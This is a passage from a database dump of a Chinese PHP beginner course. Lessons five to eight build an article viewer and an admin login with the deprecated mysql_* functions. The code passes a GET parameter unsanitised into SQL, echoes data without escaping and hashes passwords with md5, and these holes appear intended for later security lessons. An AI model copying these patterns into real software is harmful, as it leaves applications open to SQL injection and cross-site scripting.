background:green;\"</span>&gt;描述：<span class=\"hljs-meta\">&lt;?php</span> <span class=\"hljs-keyword\">echo</span> $value[<span class=\"hljs-string\">\'description\'</span>]<span class=\"hljs-meta\">?&gt;</span>&lt;/div&gt;\r\n\r\n&lt;a style=<span class=\"hljs-string\">\"width:100px; height:50px; background:gray;\"</span> href=<span class=\"hljs-string\">\"article.show.php?id=&lt;?php echo $value[\'id\']?&gt;\"</span>&gt;点击查看全文&lt;/a&gt;\r\n\r\n<span class=\"hljs-meta\">&lt;?php</span>\r\n\r\n}\r\n\r\n<span class=\"hljs-meta\">?&gt;</span>\r\n\r\n&lt;/body&gt;\r\n\r\n&lt;/html&gt;</code></pre><p>上面的代码看起来确实很乱。Php代码和html代码混淆在一起。这个就是我们以后讲mvc模式的时候能够体现出mvc模式的好处。</p><p>我们看php标签&lt;?php\r\n?&gt;内的代码就行。</p><p><span style=\"font-family: Menlo, Monaco, Consolas, \'Courier New\', monospace; font-size: inherit; line-height: 1.5; white-space: pre-wrap; background-color: rgb(248, 248, 248);\">$query=mysql_query(\'select * from article order by dateline desc\'); </span>//这里面是mysql的语句。具体可以看mysql相关的课程。表示从article数据库表中选择出所有内容。order by dateline desc 表示以dataline字段降序排列。最终将执行的结果存放到一个php变量中了。因为数据库什么也没有所有这个变量的值此时肯定为null。我们可以用php的打印函数打印出来看下。</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:104.25pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p45.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p><v:shapetype coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\"><v:shape o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:104.25pt;visibility:visible\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/p46.png\"><br></v:imagedata></v:shape></v:shapetype></p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:6in;height:70.5pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"></v:imagedata></v:shape></p><p>输出结果分别为第5行和第9行，证明数据连接成功了，但是没有数据。mysql_fetch_assoc（）函数是从mysql_query返回的结果中取出数据。返回false表示没有数据。</p><p>本节中的相关html代码可以查看前端的技术学习，或者自行上完搜索html代码学习。</p><p>2）注意</p><p></p><p>上面我们通过图示的方式告诉怎么进入线上编程环境。需要注意的是，每次重新部署以后所有环境都会重置，所以希望学员在学习的时候吧编写好的代码，存在本地。</p><p><br></p>',1,'<p>4</p>'),(53,'php基础课程五','php基础编程，通过一个简单的php系统，来说明php语言的用法以及各种基础知识。','<h2><span style=\"font-size: 14px;\">1）我们接着前面的内容继续</span><br></h2><p>编写如下代码。文件名为article.show.php</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:124.5pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p51.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><h2><br></h2><p><br></p><p><br></p>',4,'http://oda8mr8yr.bkt.clouddn.com/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB3.jpg','daocloud.io/catteam/phpcodiad:master-ce6f50c','2016-10-10 14:43:15',1,NULL,'<h2><span style=\"font-size: 14px;\">1）源码分析</span><br></h2><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-comment\">//article.show.php</span>\r\n\r\n<span class=\"hljs-meta\">&lt;?php</span>\r\n\r\n<span class=\"hljs-keyword\">require_once</span>(<span class=\"hljs-string\">\'connect.php\'</span>);\r\n\r\n$id=$_GET[<span class=\"hljs-string\">\'id\'</span>];\r\n\r\n$query=mysql_query(<span class=\"hljs-string\">\"select * from article where id=\'$id\'\"</span>);\r\n\r\n$row=mysql_fetch_assoc($query);\r\n\r\n<span class=\"hljs-meta\">?&gt;</span>\r\n\r\n&lt;!doctype html&gt;\r\n\r\n&lt;html lang=<span class=\"hljs-string\">\"en\"</span>&gt;\r\n\r\n&lt;head&gt;\r\n\r\n    &lt;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>&gt;\r\n\r\n    &lt;title&gt;Document&lt;/title&gt;\r\n\r\n&lt;/head&gt;\r\n\r\n&lt;body&gt;\r\n\r\n&lt;div style=<span class=\"hljs-string\">\"width:200px; height:30px; background:#D94600;\"</span>&gt;<span class=\"hljs-meta\">&lt;?php</span> <span class=\"hljs-keyword\">echo</span> $row[<span class=\"hljs-string\">\'title\'</span>]<span class=\"hljs-meta\">?&gt;</span>&lt;/div&gt;\r\n\r\n&lt;div style=<span class=\"hljs-string\">\"width:200px; height:100px; background: green;\"</span>&gt;<span class=\"hljs-meta\">&lt;?php</span> <span class=\"hljs-keyword\">echo</span> $row[<span class=\"hljs-string\">\'content\'</span>]<span class=\"hljs-meta\">?&gt;</span>&lt;/div&gt;\r\n\r\n&lt;/body&gt;\r\n\r\n&lt;/html&gt;</code></pre><p>上面关于php的代码大部分都讲解过了。这里出现了$_GET[‘id’]表示从前端以get方式接收参数。具体的还有post方式等。关于get和post的区别可以自行上网搜索相关资料。</p><p>整个php的逻辑如下图：</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image003.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p52.png\"></p><p><img src=\"http://oda8mr8yr.bkt.clouddn.com/p53.png\"></p><p>此处服务端$id的值为2 如果前端从传1则$id为1。</p><p>2）前几节的所有课程基本上是讲解了用户端所有的逻辑。</p><p>包括，连接数据库，从数据库查询文章，然后展示文章内容等。接下来我们讲解后端的功能。</p><p>3）注意</p><p></p><p>上面我们通过图示的方式告诉怎么进入线上编程环境。需要注意的是，每次重新部署以后所有环境都会重置，所以希望学员在学习的时候吧编写好的代码，存在本地。</p><p><br></p>',1,'<p>5</p>'),(54,'php基础课程六','php基础编程，通过一个简单的php系统，来说明php语言的用法以及各种基础知识。','<h2><span style=\"font-size: 14px;\">1）我们接着前面的内容继续。接下来的课程基本上是关于管理的操作。主要包括管理员登陆，增加文章，修改文章，删除文章等。</span><br></h2><p>首先我们建立一个admin文件夹，然后在此文件夹下简历index.php。内容暂时为空，这个文件表示管理员首页。我们先开编写login.php文件，即管理员登陆页面。文件结构如下图</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:169.5pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p61.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>管理员登陆界面如下图所示：</p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:6in;height:85.5pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p62.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape type=\"#_x0000_t75\" style=\"width:6in;height:85.5pt;visibility:visible\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/p63.png\"><br></v:imagedata></v:shape></p><p><v:shape id=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:287.25pt;height:177.75pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.jpg\"></v:imagedata></v:shape></p><p><br></p>',4,'http://oda8mr8yr.bkt.clouddn.com/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB3.jpg','daocloud.io/catteam/phpcodiad:master-ce6f50c','2016-10-10 14:43:37',1,NULL,'<h2><span style=\"font-size: 14px;\">1）源码分析</span><br></h2><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-comment\">//admin/login.php</span>\r\n\r\n<span class=\"hljs-meta\">&lt;?php</span>\r\n\r\nob_start();\r\n\r\nsession_start();\r\n\r\n<span class=\"hljs-keyword\">require_once</span>(<span class=\"hljs-string\">\'../connect.php\'</span>);\r\n\r\n<span class=\"hljs-keyword\">if</span>( <span class=\"hljs-keyword\">isset</span>( $_POST[ <span class=\"hljs-string\">\'Login\'</span> ] ) ) { <span class=\"hljs-comment\">//检测登陆值是否设置了</span>\r\n\r\n$user = $_POST[ <span class=\"hljs-string\">\'username\'</span> ];  <span class=\"hljs-comment\">//post方式得到用户名变量值</span>\r\n\r\n$user = stripslashes( $user ); <span class=\"hljs-comment\">//清理addslashes()函数添加的反斜杠</span>\r\n\r\n$user = mysql_real_escape_string( $user ); <span class=\"hljs-comment\">//过滤用户名的值，防止恶意数据进入数据库，后面在讲sql注入的时候会讲到</span>\r\n\r\n$pass = $_POST[ <span class=\"hljs-string\">\'password\'</span> ];\r\n\r\n$pass = stripslashes( $pass );\r\n\r\n$pass = mysql_real_escape_string( $pass );\r\n\r\n$pass = md5( $pass );\r\n\r\n$qry = <span class=\"hljs-string\">\"SELECT * FROM `users` WHERE user_name=\'$user\' AND user_pwd=\'$pass\';\"</span>; <span class=\"hljs-comment\">//这里用户名和密码必须同时验证</span>\r\n\r\n$result = @mysql_query($qry) <span class=\"hljs-keyword\">or</span> <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">\'&lt;pre&gt;\'</span> . mysql_error() . <span class=\"hljs-string\">\'&lt;/pre&gt;\'</span> ); <span class=\"hljs-comment\">//从数据库中选择用户如果能选出来说明用户存在切正确</span>\r\n\r\n$res=mysql_fetch_array($result);\r\n\r\n<span class=\"hljs-keyword\">if</span>( $result &amp;&amp; mysql_num_rows( $result ) == <span class=\"hljs-number\">1</span> ) {   <span class=\"hljs-comment\">// Login Successful...</span>\r\n\r\n        setcookie(<span class=\"hljs-string\">\'uid\'</span>, $res[<span class=\"hljs-string\">\'user_id\'</span>]);\r\n\r\n       $_SESSION[<span class=\"hljs-string\">\'username\'</span>]=$user;            <span class=\"hljs-comment\">//用户名的值存入到session</span>\r\n\r\n        $_SESSION[<span class=\"hljs-string\">\'uid\'</span>]=$res[<span class=\"hljs-string\">\'user_id\'</span>];      <span class=\"hljs-comment\">//用户id的值存入到session</span>\r\n\r\n        header(<span class=\"hljs-string\">\"Location: index.php\"</span>);       <span class=\"hljs-comment\">//登陆成功以后跳转到管理员首页</span>\r\n\r\n}<span class=\"hljs-keyword\">else</span>{\r\n\r\n        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">\"Login failed\"</span>);\r\n\r\n}\r\n\r\n \r\n\r\n}\r\n\r\n<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"\r\n\r\n \r\n\r\n&lt;!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Strict//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\\\"&gt;\r\n\r\n \r\n\r\n&lt;html xmlns=\\\"http://www.w3.org/1999/xhtml\\\"&gt;\r\n\r\n \r\n\r\n&lt;head&gt;\r\n\r\n \r\n\r\n        &lt;meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=UTF-8\\\" /&gt;\r\n\r\n \r\n\r\n        &lt;title&gt;php教学系统&lt;/title&gt;\r\n\r\n \r\n\r\n        &lt;link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"\\\" /&gt;\r\n\r\n \r\n\r\n&lt;/head&gt;\r\n\r\n \r\n\r\n&lt;body&gt;\r\n\r\n&lt;div class=\\\"user_login\\\"&gt;\r\n\r\n&lt;div class=\\\"mLogo\\\"&gt;\r\n\r\n        &lt;font&gt;欢迎登陆 CatTeam php教学系统 JULY.2016&lt;/font&gt;\r\n\r\n    &lt;/div&gt;\r\n\r\n   &lt;div class=\\\"loginBox\\\"&gt;\r\n\r\n       &lt;div class=\\\"login\\\"&gt;\r\n\r\n       &lt;form action=\\\"login.php\\\" method=\\\"post\\\"&gt;\r\n\r\n           &lt;span class=\\\"s1\\\"&gt;&lt;input name=\\\"username\\\" type=\\\"text\\\" class=\\\"uNmae\\\" value=\\\"\\\" /&gt;&lt;/span&gt;\r\n\r\n           &lt;span class=\\\"s2\\\"&gt;&lt;input name=\\\"password\\\" type=\\\"password\\\" class=\\\"pWord\\\" value=\\\"\\\" /&gt;&lt;/span&gt;\r\n\r\n           &lt;input class=\\\"loginGo\\\" id=\\\"userLoginGo\\\" type=\\\"submit\\\" name=\\\"Login\\\" value=\\\"登陆\\\" /&gt;\r\n\r\n       &lt;/form&gt;\r\n\r\n       &lt;/div&gt;\r\n\r\n   &lt;/div&gt;\r\n\r\n &lt;div class=\\\"footer\\\"&gt;\r\n\r\n       copyright@猫团队 2015 Hacked by CatTeam\r\n\r\n   &lt;/div&gt;\r\n\r\n&lt;/div&gt;\r\n\r\n \r\n\r\n&lt;/body&gt;\r\n\r\n \r\n\r\n&lt;/html&gt;\r\n\r\n\"</span>;\r\n\r\n<span class=\"hljs-meta\">?&gt;</span></code></pre><p>ob_start()打开缓冲区，将内容输出到缓冲区，详细的可以查看php文档。</p><p>session_start()表示启用session在后面我们可以用$_SESSION来获取服务端session的值。关于其它代码的讲解看下图中的注释</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p64.png\"></p><p>注意上面代码中有个if(){}else{}语句。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-keyword\">If</span>后面圆括弧{（）}中的值为真时则程序执行<span class=\"hljs-keyword\">if</span>大括弧{}中的代码。否则执行<span class=\"hljs-keyword\">else</span>大括弧{}中的代码。流程图如下：\r\n\r\n<span class=\"hljs-keyword\">if</span> (条件) { <span class=\"hljs-keyword\">if</span> 条件成立时执行的代码; } <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (条件) { <span class=\"hljs-keyword\">elseif</span> 条件成立时执行的代码; } <span class=\"hljs-keyword\">else</span> { 条件不成立时执行的代码; }\r\n\r\n其中<span class=\"hljs-keyword\">elseif</span>可以省略，甚至<span class=\"hljs-keyword\">else</span>也可以省略。如本系统中就只使用了<span class=\"hljs-keyword\">if</span>(){\r\n\r\n<span class=\"hljs-keyword\">if</span>(){}<span class=\"hljs-keyword\">else</span>{}\r\n\r\n}<span class=\"hljs-comment\">//else省略了。</span></code></pre><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p65.png\"></p><p>同样用来控制条件走向的流程语句还有switch………case语句。关于switch语句学员可以查资料学习。具体我们后面遇到了再讲解。</p><p>2）注意</p><p></p><p>上面我们通过图示的方式告诉怎么进入线上编程环境。需要注意的是，每次重新部署以后所有环境都会重置，所以希望学员在学习的时候吧编写好的代码，存在本地。</p><p><br></p>',1,'<p>6</p>'),(55,'php基础课程七','php基础编程，通过一个简单的php系统，来说明php语言的用法以及各种基础知识。','<h2><span style=\"font-size: 14px;\">1）我们接着前面的内容继续。接下来的课程基本上是关于管理的操作。主要包括管理员登陆，增加文章，修改文章，删除文章等。</span><br></h2><p>首先我们建立一个admin文件夹，然后在此文件夹下简历index.php。内容暂时为空，这个文件表示管理员首页。我们先开编写login.php文件，即管理员登陆页面。文件结构如下图</p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/p71.png\"><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:169.5pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"></v:imagedata></v:shape></v:shapetype></p><p>这节课我们来看index.php代码</p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:6in;height:123pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p72.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>登陆成功以后如图所示</p><p><v:shape id=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:6in;height:53.25pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p73.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><br></p>',4,'http://oda8mr8yr.bkt.clouddn.com/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB3.jpg','daocloud.io/catteam/phpcodiad:master-ce6f50c','2016-10-10 14:43:57',1,NULL,'<h2><span style=\"font-size: 14px;\">1）源码分析</span><br></h2><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-comment\">//admin/index.php</span>\r\n\r\n<span class=\"hljs-meta\">&lt;?php</span>\r\n\r\n<span class=\"hljs-comment\">/*管理员首页*/</span>\r\n\r\nob_start();\r\n\r\nsession_start();\r\n\r\n<span class=\"hljs-keyword\">require_once</span>(<span class=\"hljs-string\">\'../connect.php\'</span>);\r\n\r\n<span class=\"hljs-keyword\">if</span>($_SESSION[<span class=\"hljs-string\">\'username\'</span>]==<span class=\"hljs-keyword\">null</span>){\r\n\r\nheader(<span class=\"hljs-string\">\"Location: login.php\"</span>);\r\n\r\n}\r\n\r\n$uid=$_SESSION[<span class=\"hljs-string\">\'uid\'</span>];\r\n\r\n$getid = <span class=\"hljs-string\">\"SELECT * FROM users WHERE user_id =$uid\"</span>;\r\n\r\n$result = mysql_query($getid) <span class=\"hljs-keyword\">or</span> <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">\'&lt;pre&gt;\'</span> . mysql_error() . <span class=\"hljs-string\">\'&lt;/pre&gt;\'</span> );\r\n\r\n$res=mysql_fetch_array($result);\r\n\r\n<span class=\"hljs-comment\">//var_dump($res);die;</span>\r\n\r\n$html=<span class=\"hljs-string\">\"\r\n\r\n&lt;table width=\\\"100%\\\" border=\\\"1\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"userList\\\"&gt;\r\n\r\n&lt;tr&gt;\r\n\r\n&lt;td&gt;用户名称&lt;/td&gt;\r\n\r\n&lt;td&gt;用户电话&lt;/td&gt;\r\n\r\n&lt;td&gt;用户email&lt;/td&gt;\r\n\r\n&lt;td&gt;用户信息&lt;/td&gt;\r\n\r\n&lt;td&gt;文章管理&lt;/td&gt;\r\n\r\n&lt;/tr&gt;\r\n\r\n&lt;tr&gt;\r\n\r\n&lt;td&gt;{$res[\'user_name\']}&lt;/td&gt;\r\n\r\n&lt;td&gt;{$res[\'user_tele\']}&lt;/td&gt;\r\n\r\n&lt;td&gt;{$res[\'user_email\']}&lt;/td&gt;\r\n\r\n&lt;td&gt;{$res[\'user_info\']}&lt;/td&gt;\r\n\r\n&lt;td&gt;&lt;a href=\\\"article.manage.php\\\"&gt;manage&lt;/a&gt;&lt;/td&gt;\r\n\r\n&lt;/tr&gt;\r\n\r\n&lt;tr&gt;&lt;td&gt;&lt;a href=\\\"logout.php\\\"&gt;退出登陆&lt;/td&gt;&lt;/tr&gt;\r\n\r\n&lt;/table&gt;\"</span>;\r\n\r\n \r\n\r\n<span class=\"hljs-keyword\">echo</span> $html;</code></pre><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">这段代码中的php逻辑首先用$_SESSION检查服务端username是否存在。因为login.php中我们已经讲解过，如果登陆成功则会设置username为$_SESSION[‘username’] ，uid为$_SESSION[‘user_id’]。Index.php中通过<span class=\"hljs-keyword\">if</span>语句来判断。如果不为空则走<span class=\"hljs-keyword\">if</span>条件体外面的流程。得到$_SESSION[‘user_id’]，通过这个id在数据库中查看用户的其他信息。</code></pre><p>2）注意</p><p></p><p>上面我们通过图示的方式告诉怎么进入线上编程环境。需要注意的是，每次重新部署以后所有环境都会重置，所以希望学员在学习的时候吧编写好的代码，存在本地。</p><p><br></p>',1,'<p>7</p>'),(56,'php基础课程八','php基础编程，通过一个简单的php系统，来说明php语言的用法以及各种基础知识。','<h2><span style=\"font-size: 14px;\">1）我们接着前面的内容继续。文件结构如下图</span><br></h2><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:196.5pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p81.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>这节课我们来看article.manage.php代码</p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:6in;height:123pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p82.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape type=\"#_x0000_t75\" style=\"width:6in;height:123pt;visibility:visible\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/p83.png\"><br></v:imagedata></v:shape></p><p><v:shape type=\"#_x0000_t75\" style=\"width:6in;height:123pt;visibility:visible\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/p84.png\"><br></v:imagedata></v:shape></p><p><br></p>',4,'http://oda8mr8yr.bkt.clouddn.com/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB3.jpg','daocloud.io/catteam/phpcodiad:master-ce6f50c','2016-10-10 14:44:22',1,NULL,'<h2><span style=\"font-size: 14px;\">1）源码分析</span><br></h2><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-comment\">//admin/article.manage.php</span>\r\n\r\n<span class=\"hljs-meta\">&lt;?php</span>\r\n\r\nob_start();\r\n\r\nsession_start();\r\n\r\n<span class=\"hljs-keyword\">if</span>($_SESSION[<span class=\"hljs-string\">\'username\'</span>]==<span class=\"hljs-keyword\">null</span>){\r\n\r\n<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"login error!\"</span>;\r\n\r\nheader(<span class=\"hljs-string\">\"Location: login.php\"</span>);\r\n\r\n}\r\n\r\n<span class=\"hljs-keyword\">require_once</span>(<span class=\"hljs-string\">\'../connect.php\'</span>);\r\n\r\n \r\n\r\n$query = mysql_query(<span class=\"hljs-string\">\"select * from article order by dateline desc\"</span>);\r\n\r\n \r\n\r\n<span class=\"hljs-keyword\">while</span>($row = mysql_fetch_assoc($query)){\r\n\r\n \r\n\r\n    $data[]=$row;\r\n\r\n}\r\n\r\n<span class=\"hljs-meta\">?&gt;</span>\r\n\r\n&lt;!DOCTYPE html&gt;\r\n\r\n&lt;html lang=<span class=\"hljs-string\">\"en\"</span>&gt;\r\n\r\n&lt;head&gt;\r\n\r\n    &lt;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>&gt;\r\n\r\n    &lt;title&gt;Title&lt;/title&gt;\r\n\r\n&lt;/head&gt;\r\n\r\n&lt;body&gt;\r\n\r\n<span class=\"hljs-meta\">&lt;?php</span>\r\n\r\n<span class=\"hljs-keyword\">foreach</span>($data <span class=\"hljs-keyword\">as</span> $value) {\r\n\r\n    <span class=\"hljs-meta\">?&gt;</span>\r\n\r\n    ID：&lt;input type=<span class=\"hljs-string\">\"text\"</span> name=<span class=\"hljs-string\">\"manage_id\"</span> value=<span class=\"hljs-string\">\"&lt;?php echo $value[\'id\'] ?&gt;\"</span>&gt;&lt;br /&gt;\r\n\r\n    标题：&lt;input type=<span class=\"hljs-string\">\"text\"</span> name=<span class=\"hljs-string\">\"manage_title\"</span> value=<span class=\"hljs-string\">\"&lt;?php echo $value[\'title\'] ?&gt;\"</span>&gt;&lt;br /&gt;\r\n\r\n    修改：&lt;a href=<span class=\"hljs-string\">\"article.add.php\"</span>&gt;增加&lt;/a&gt;\r\n\r\n     &lt;a href=<span class=\"hljs-string\">\"article.modify.php?id=&lt;?php echo $value[\'id\']?&gt;\"</span>&gt;修改&lt;/a&gt;\r\n\r\n      &lt;a href=<span class=\"hljs-string\">\"article.del.handle.php?id=&lt;?php echo $value[\'id\']?&gt;\"</span>&gt;删除&lt;/a&gt;\r\n\r\n      &lt;br /&gt;\r\n\r\n \r\n\r\n    <span 